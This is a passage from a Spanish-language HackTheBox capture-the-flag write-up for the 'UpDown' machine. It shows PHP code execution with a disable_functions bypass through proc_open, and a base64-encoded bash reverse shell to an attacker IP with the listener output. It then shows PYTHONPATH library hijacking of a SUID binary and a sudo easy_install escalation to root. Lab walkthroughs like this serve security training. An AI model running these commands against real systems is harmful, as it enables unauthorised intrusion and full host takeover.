href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/UpDown/php_execute.py"><code>php_execute.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/UpDown#php_executepy">aquí</a>). Ahora podemos ejecutar el código PHP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">php_execute.py</span> <span class="code-dark-yellow">'&lt;?php echo "pwned"; ?&gt;'</span>  
+pwned
+</code></pre></div><h3 id="obteniendo-rce">Obteniendo RCE</h3><p>Intentemos llamar a <code>system</code> para ver si tenemos ejecución remota de comandos (<em>Remote Code Execution</em>, RCE):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">php_execute.py</span> <span class="code-dark-yellow">'&lt;?php system("whoami"); ?&gt;'</span>  
+
+</code></pre></div><p>La salida está vacía &mldr; podemos intentarlo con <code>exec</code>, <code>shell_exec</code> o <code>passthru</code> y ninguna funciona. A lo mejor el servidor tiene activado <code>disable_functions</code>. Para verificar esto, podemos ejecutar <code>phpinfo()</code> y analizar la lista de funciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">php_execute.py</span> <span class="code-dark-yellow">'&lt;?php phpinfo(); ?&gt;'</span> | <span class="code-dark-green">grep</span> disable_functions
+&lt;tr&gt;&lt;td class="e"&gt;<span class="code-red">disable_functions</span>&lt;/td&gt;&lt;td class="v"&gt;pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen&lt;/td&gt;&lt;td class="v"&gt;pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen&lt;/td&gt;&lt;/tr&gt;  
+</code></pre></div><p>Ahora tiene sentido, todas las funciones probadas previamente están deshabilitadas. Sin embargo, hay una que no está ahí: <a href="https://www.php.net/manual/en/function.proc-open.php"><code>proc_open</code></a> (más información en <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-safe_mode-bypass-via-proc_open-and-custom-environment-exploit">HackTricks</a>). Con esta función podemos ejecutar comandos del sistema con PHP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">php_execute.py</span> <span class="code-dark-yellow">'&lt;?php $p = proc_open("whoami", array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w")), $pipes); echo stream_get_contents($pipes[1]); ?&gt;'</span>  
+www-data
+</code></pre></div><p>Entonces, es hora de una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">php_execute.py</span> <span class="code-dark-yellow">'&lt;?php $p = proc_open("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash", array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w")), $pipes); echo stream_get_contents($pipes[1]); ?&gt;'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.177.
+Ncat: Connection from 10.10.11.177:40964.
+bash: cannot set terminal process group (912): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@updown:/var/www/dev/uploads/0bf9a4f3d7849eec968dc21acc26b43b$ cd ..
+cd ..
+www-data@updown:/var/www/dev/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@updown:/var/www/dev/uploads$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@updown:/var/www/dev/uploads$ export TERM=xterm
+www-data@updown:/var/www/dev/uploads$ export SHELL=bash
+www-data@updown:/var/www/dev/uploads$ stty rows 50 columns 158
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Podemos ver que se llama un usuario del sistema llamado <code>developer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@updown:/var/www/dev/uploads$ ls -l /home
+total 4
+drwxr-xr-x 6 developer developer 4096 Aug 30 11:24 developer  
+</code></pre></div><p>En <code>/home/developer</code> vemos un directorio llamado <code>dev</code>, y dentro hay un binario SUID llamado <code>siteisup</code> junto con un <em>script</em> en Python llamado <code>siteisup_test.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@updown:/var/www/dev/uploads$ ls -la /home/developer
+total 40
+drwxr-xr-x 6 developer developer 4096 Aug 30 11:24 .
+drwxr-xr-x 3 root      root      4096 Jun 22 15:47 ..
+lrwxrwxrwx 1 root      root         9 Jul 27 14:21 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 developer developer  231 Jun 22 15:45 .bash_logout
+-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
+drwx------ 2 developer developer 4096 Aug 30 11:24 .cache
+drwxrwxr-x 3 developer developer 4096 Aug  1 18:19 .local
+-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
+drwx------ 2 developer developer 4096 Aug  2 09:15 .ssh
+drwxr-x--- 2 developer www-data  4096 Jun 22 15:45 dev
+-rw-r----- 1 root      developer   33 Oct 17 19:26 user.txt
+www-data@updown:/var/www/dev/uploads$ ls -la /home/developer/dev/
+total 32
+drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
+drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
+-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
+-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
+www-data@updown:/var/www/dev/uploads$ file /home/developer/dev/siteisup
+/home/developer/dev/siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped  
+</code></pre></div><p>Como <code>www-data</code>, podemos leer ambos archivos. El <em>script</em> en Python tiene este aspecto:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span>
+
+<span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">"Enter URL here:"</span><span class="mtk1">)</span>
+<span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk1">url</span><span class="mtk1">)</span>
+<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk1">status_code</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">200</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1"> </span><span class="mtk4">"Website is up"</span>
+<span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1"> </span><span class="mtk4">"Website is down"</span>  
+</code></pre></div><p>Probablemente, el binario es una versión compilada del <em>script</em>. Podemos intentar causar un fallo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@updown:/var/www/dev/uploads$ /home/developer/dev/siteisup
+Welcome to 'siteisup.htb' application
+
+Enter URL here:file:///etc/passwd
+Traceback (most recent call last):
+  File "/home/developer/dev/siteisup_test.py", line 3, in &lt;module&gt;  
+    url = input("Enter URL here:")
+  File "&lt;string&gt;", line 1
+    file:///etc/passwd
+        ^
+SyntaxError: invalid syntax
+</code></pre></div><p>Confirmado, es la versión compilada del <em>script</em>. Ahora tenemos dos opciones:</p><ol><li>Configurar una variable <code>PYTHONPATH</code> y crear un <em>script</em> llamado <code>requests.py</code>, de manera que secuestramos la librería <code>requests</code></li><li>Dado que está escrito en Python versión 2.x, podemos abusar de la función <code>input</code> y ejecutar código arbitrario de Python (más información en <a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/">www.geeksforgeeks.com</a>)</li></ol><p>Usaré el primero:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@updown:/var/www/dev/uploads$ cd /tmp
+www-data@updown:/tmp$ echo 'import os; os.system("bash -p");' &gt; requests.py  
+www-data@updown:/tmp$ export PYTHONPATH=.
+www-data@updown:/tmp$ /home/developer/dev/siteisup
+Welcome to 'siteisup.htb' application
+
+developer@updown:/tmp$ cd /home/developer
+developer@updown:/home/developer$ cat user.txt
+cat: user.txt: Permission denied
+</code></pre></div><p>Ahora somos <code>developer</code>, pero no podemos leer la <em>flag</em> <code>user.txt</code> porque solo está permitido para el usuario <code>root</code> y los miembros del grupo <code>developer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@updown:/home/developer$ whoami
+developer
+developer@updown:/home/developer$ id
+uid=1002(developer) gid=33(www-data) groups=33(www-data)
+developer@updown:/home/developer$ ls -la
+total 40
+drwxr-xr-x 6 developer developer 4096 Aug 30 11:24 <span class="code-blue">.</span>
+drwxr-xr-x 3 root      root      4096 Jun 22 15:47 <span class="code-blue">..</span>
+lrwxrwxrwx 1 root      root         9 Jul 27 14:21 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>  
+-rw-r--r-- 1 developer developer  231 Jun 22 15:45 .bash_logout
+-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
+drwx------ 2 developer developer 4096 Aug 30 11:24 <span class="code-blue">.cache</span>
+drwxrwxr-x 3 developer developer 4096 Aug  1 18:19 <span class="code-blue">.local</span>
+-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
+drwx------ 2 developer developer 4096 Aug  2 09:15 <span class="code-blue">.ssh</span>
+drwxr-x--- 2 developer www-data  4096 Jun 22 15:45 <span class="code-blue">dev</span>
+-rw-r----- 1 root      developer   33 Oct 17 19:26 user.txt
+</code></pre></div><p>Pero podemos usar la tecla SSH privada para conectarse a través de SSH como <code>developer</code> sin contraseña:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@updown:/home/developer$ ssh -i .ssh/id_rsa developer@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:npwXkHj+pLo3LaYR66HNCKEpU/vUoTG03FL41SMlIh0.  
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+developer@updown:~$ cat user.txt
+bc6668d519991f103cc0f2ff873d5c9a
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Este usuario puede ejecutar <code>/usr/local/bin/easy_install</code> como <code>root</code> con <code>sudo</code> (sin contraseña):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@updown:~$ sudo -l
+Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install
+</code></pre></div><p>Este comando se utiliza para instalar bibliotecas de Python, es solo un administrador de paquetes.Por lo tanto, es fundamental tener privilegios elevados en dicho comando.</p><p>Existe un <a href="https://gtfobins.github.io/gtfobins/easy_install/">GTFOBin</a> que afecta a este comando, por lo que la escalada de privilegios es fácil. Usando mi herramienta <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a> podemos encontrar los pasos necesarios para escalar privilegios con <code>easy_install</code> y <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --sudo easy_install
+
+<span class="code-bg-green code-black">easy_install</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/easy_install/</span>
+
+
+<span class="code-red mtku">Sudo</span>
+
+If the binary is allowed to run as superuser by <span class="code-cyan">sudo</span>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.  
+
+<span class="code-cyan">TF=$(mktemp -d)</span>
+<span class="code-cyan">echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py</span>
+<span class="code-cyan">sudo easy_install $TF
+</code></pre></div><p>Ahora, ejecutamos los comandos anteriores y obtenemos acceso como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@updown:~$ cd /tmp
+developer@updown:/tmp$ TF=$(mktemp -d)
+developer@updown:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py  
+developer@updown:/tmp$ sudo easy_install $TF
+WARNING: The easy_install command is deprecated and will be removed in a future version.
+Processing tmp.Jrtbwy1kde
+Writing /tmp/tmp.Jrtbwy1kde/setup.cfg
+Running setup.py -q bdist_egg --dist-dir /tmp/tmp.Jrtbwy1kde/egg-dist-tmp-cTzxdU
+# whoami
+root
+# bash
+root@updown:/tmp/tmp.Jrtbwy1kde# cd
+root@updown:~# cat root.txt
+1161dfa939e78faecd7b07fda0ddec82
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraciónn">Enumeraciónn</a><ul><li><a href="#enumeración-de-git">Enumeración de Git</a></li></ul></li><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#obteniendo-rce">Obteniendo RCE</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
